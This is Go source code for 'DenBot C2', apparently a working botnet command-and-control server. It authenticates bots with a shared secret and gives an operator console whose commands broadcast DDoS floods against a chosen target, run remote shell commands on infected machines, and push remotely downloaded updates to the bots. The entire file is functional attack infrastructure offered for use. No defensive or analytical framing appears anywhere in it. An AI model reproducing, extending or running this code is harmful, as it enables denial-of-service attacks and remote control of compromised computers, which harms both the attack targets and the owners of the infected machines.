// DenBot C2 v4.7
// build: go build -o denbot-c2 denbot-c2.go
// run:   ./denbot-c2 -port 4444 -secret "$DENBOT_SECRET"
// optional TLS: -tls -cert server.crt -key server.key

package main

import (
	"bufio"
	"crypto/subtle"
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

var (
	port     = flag.Int("port", 4444, "C2 listen port")
	secret   = flag.String("secret", envOr("DENBOT_SECRET", "foxden2026"), "shared secret for bot auth")
	useTLS   = flag.Bool("tls", false, "enable TLS")
	certFile = flag.String("cert", "server.crt", "TLS cert path")
	keyFile  = flag.String("key", "server.key", "TLS key path")
)

type Command struct {
	Action   string   `json:"action"`
	Target   string   `json:"target,omitempty"`
	Duration int      `json:"duration,omitempty"`
	Rate     int      `json:"rate,omitempty"`
	Threads  int      `json:"threads,omitempty"`
	Proxies  []string `json:"proxies,omitempty"`
	AttackID string   `json:"attack_id,omitempty"`
	Cmd      string   `json:"cmd,omitempty"`
	URL      string   `json:"url,omitempty"`
	SHA256   string   `json:"sha256,omitempty"`
}

type Response struct {
	Type     string `json:"type"`
	AttackID string `json:"attack_id,omitempty"`
	Cmd      string `json:"cmd,omitempty"`
	Output   string `json:"output,omitempty"`
	Error    string `json:"error,omitempty"`
	Status   string `json:"status,omitempty"`
}

type Hello struct {
	Secret  string `json:"secret"`
	ID      string `json:"id"`
	OS      string `json:"os"`
	Version string `json:"version"`
}

type Heartbeat struct {
	Type     string `json:"type"`
	AttackID string `json:"attack_id,omitempty"`
	Status   string `json:"status,omitempty"`
	Sent     int    `json:"sent,omitempty"`
}

type BotInfo struct {
	ID       string
	OS       string
	IP       string
	LastSeen time.Time
	Status   string
	Conn     net.Conn
	Version  string
	encMu    sync.Mutex
	enc      *json.Encoder
	decMu    sync.Mutex
	dec      *json.Decoder
}

func (b *BotInfo) Send(cmd Command) error {
	b.encMu.Lock()
	defer b.encMu.Unlock()
	_ = b.Conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
	return b.enc.Encode(cmd)
}

var (
	bots   = make(map[string]*BotInfo)
	botsMu sync.RWMutex
)

func envOr(key, def string) string {
	if v := os.Getenv(key); v != "" {
		return v
	}
	return def
}

func main() {
	flag.Parse()

	fmt.Println("╔════════════════════════════════════════════╗")
	fmt.Println("║          DenBot C2 v4.7                    ║")
	fmt.Println("╚════════════════════════════════════════════╝")

	addr := fmt.Sprintf(":%d", *port)
	var ln net.Listener
	var err error
	if *useTLS {
		cert, cerr := tls.LoadX509KeyPair(*certFile, *keyFile)
		if cerr != nil {
			fmt.Println("[!] TLS cert load:", cerr)
			os.Exit(1)
		}
		ln, err = tls.Listen("tcp", addr, &tls.Config{
			Certificates: []tls.Certificate{cert},
			MinVersion:   tls.VersionTLS12,
		})
		fmt.Printf("[*] TLS listening on %s\n", addr)
	} else {
		ln, err = net.Listen("tcp", addr)
		fmt.Printf("[*] TCP listening on %s\n", addr)
	}
	if err != nil {
		fmt.Println("[!] listen:", err)
		os.Exit(1)
	}

	go cliLoop()
	go reaperLoop()

	for {
		conn, err := ln.Accept()
		if err != nil {
			continue
		}
		go handleBot(conn)
	}
}

func handleBot(conn net.Conn) {
	defer conn.Close()
	_ = conn.SetReadDeadline(time.Now().Add(15 * time.Second))

	decoder := json.NewDecoder(conn)
	var hello Hello
	if err := decoder.Decode(&hello); err != nil {
		return
	}
	if subtle.ConstantTimeCompare([]byte(hello.Secret), []byte(*secret)) != 1 {
		fmt.Printf("[!] Bad secret from %s\n", conn.RemoteAddr())
		return
	}
	if hello.ID == "" {
		return
	}

	ip, _, _ := net.SplitHostPort(conn.RemoteAddr().String())
	bot := &BotInfo{
		ID:       hello.ID,
		OS:       hello.OS,
		IP:       ip,
		LastSeen: time.Now(),
		Status:   "idle",
		Conn:     conn,
		Version:  hello.Version,
		enc:      json.NewEncoder(conn),
		dec:      decoder,
	}

	botsMu.Lock()
	if old, ok := bots[bot.ID]; ok {
		_ = old.Conn.Close()
	}
	bots[bot.ID] = bot
	botsMu.Unlock()

	fmt.Printf("[+] Bot connected: %s (%s) v%s from %s\n", bot.ID, bot.OS, bot.Version, bot.IP)

	defer func() {
		botsMu.Lock()
		if cur, ok := bots[bot.ID]; ok && cur == bot {
			delete(bots, bot.ID)
		}
		botsMu.Unlock()
		fmt.Printf("[-] Bot disconnected: %s\n", bot.ID)
	}()

	for {
		_ = conn.SetReadDeadline(time.Now().Add(120 * time.Second))
		var msg interface{}

		if err := decoder.Decode(&msg); err != nil {
			return
		}

		msgMap, ok := msg.(map[string]interface{})
		if !ok {
			continue
		}

		msgType, ok := msgMap["type"].(string)
		if !ok {
			continue
		}

		botsMu.Lock()
		bot.LastSeen = time.Now()
		botsMu.Unlock()

		switch msgType {
		case "heartbeat":
			if status, ok := msgMap["status"].(string); ok {
				botsMu.Lock()
				bot.Status = status
				botsMu.Unlock()
			}

		case "shell_result":
			cmd, _ := msgMap["cmd"].(string)
			output, _ := msgMap["output"].(string)
			errMsg, _ := msgMap["error"].(string)
			fmt.Printf("[*] Shell result from %s:\n", bot.ID)
			if cmd != "" {
				fmt.Printf("    cmd: %s\n", cmd)
			}
			if output != "" {
				fmt.Printf("    output: %s\n", output)
			}
			if errMsg != "" {
				fmt.Printf("    error: %s\n", errMsg)
			}

		case "attack_complete":
			atkID, _ := msgMap["attack_id"].(string)
			status, _ := msgMap["status"].(string)
			fmt.Printf("[*] Attack %s completed on %s: %s\n", atkID, bot.ID, status)

		case "update_complete":
			fmt.Printf("[*] Bot %s update initiated\n", bot.ID)

		case "update_error":
			errMsg, _ := msgMap["error"].(string)
			fmt.Printf("[!] Update error on %s: %s\n", bot.ID, errMsg)

		default:
			fmt.Printf("[*] Unknown message type from %s: %s\n", bot.ID, msgType)
		}
	}
}

func reaperLoop() {
	t := time.NewTicker(30 * time.Second)
	for range t.C {
		cutoff := time.Now().Add(-3 * time.Minute)
		botsMu.Lock()
		for id, b := range bots {
			if b.LastSeen.Before(cutoff) {
				_ = b.Conn.Close()
				delete(bots, id)
			}
		}
		botsMu.Unlock()
	}
}

func snapshotBots() []*BotInfo {
	botsMu.RLock()
	defer botsMu.RUnlock()
	out := make([]*BotInfo, 0, len(bots))
	for _, b := range bots {
		out = append(out, b)
	}
	return out
}

func cliLoop() {
	reader := bufio.NewReader(os.Stdin)
	for {
		fmt.Print("c2> ")
		line, err := reader.ReadString('\n')
		if err != nil {
			return
		}
		parts := strings.Fields(strings.TrimSpace(line))
		if len(parts) == 0 {
			continue
		}
		switch parts[0] {
		case "bots":
			for _, b := range snapshotBots() {
				fmt.Printf("%s | %s | %s | v%s | %s | seen %s\n",
					b.ID, b.OS, b.IP, b.Version, b.Status,
					b.LastSeen.Format("15:04:05"))
			}
		case "attack":
			if len(parts) < 6 {
				fmt.Println("usage: attack <target> <sec> <rate> <threads> [proxy1 proxy2 ...]")
				continue
			}
			duration, rate, threads := atoi(parts[2]), atoi(parts[3]), atoi(parts[4])
			if duration <= 0 || rate <= 0 || threads <= 0 {
				fmt.Println("[!] invalid parameters: duration, rate, threads must be > 0")
				continue
			}
			atkID := fmt.Sprintf("atk_%d", time.Now().Unix())
			cmd := Command{
				Action:   "start_ddos",
				Target:   parts[1],
				Duration: duration,
				Rate:     rate,
				Threads:  threads,
				Proxies:  parts[5:],
				AttackID: atkID,
			}
			n := broadcast(cmd)
			fmt.Printf("[+] Attack %s sent to %d bots\n", atkID, n)
		case "stop":
			if len(parts) < 2 {
				fmt.Println("usage: stop <attack_id|all>")
				continue
			}
			n := broadcast(Command{Action: "stop_ddos", AttackID: parts[1]})
			fmt.Printf("[+] Stop sent to %d bots\n", n)
		case "shell":
			if len(parts) < 3 {
				fmt.Println("usage: shell <bot_id> <cmd...>")
				continue
			}
			id := parts[1]
			cmdline := strings.Join(parts[2:], " ")
			botsMu.RLock()
			b, ok := bots[id]
			botsMu.RUnlock()
			if !ok {
				fmt.Println("[!] no such bot")
				continue
			}
			if err := b.Send(Command{Action: "shell", Cmd: cmdline}); err != nil {
				fmt.Println("[!] send:", err)
			}
		case "update":
			if len(parts) < 3 {
				fmt.Println("usage: update <bot_id|all> <url> [sha256]")
				continue
			}
			botID := parts[1]
			urlStr := parts[2]
			sha256 := ""
			if len(parts) > 3 {
				sha256 = parts[3]
			}
			cmd := Command{
				Action: "download_update",
				URL:    urlStr,
				SHA256: sha256,
			}
			if botID == "all" {
				n := broadcast(cmd)
				fmt.Printf("[+] Update sent to %d bots\n", n)
			} else {
				botsMu.RLock()
				b, ok := bots[botID]
				botsMu.RUnlock()
				if !ok {
					fmt.Println("[!] no such bot")
					continue
				}
				if err := b.Send(cmd); err != nil {
					fmt.Println("[!] send:", err)
				} else {
					fmt.Printf("[+] Update sent to %s\n", botID)
				}
			}
		case "help", "?":
			fmt.Println("commands: bots | attack | stop | shell | update | exit")
		case "exit", "quit":
			os.Exit(0)
		default:
			fmt.Println("unknown:", parts[0])
		}
	}
}

func broadcast(cmd Command) int {
	targets := snapshotBots()
	sent := 0
	for _, b := range targets {
		if err := b.Send(cmd); err == nil {
			sent++
		}
	}
	return sent
}

func atoi(s string) int {
	i, _ := strconv.Atoi(s)
	return i
}
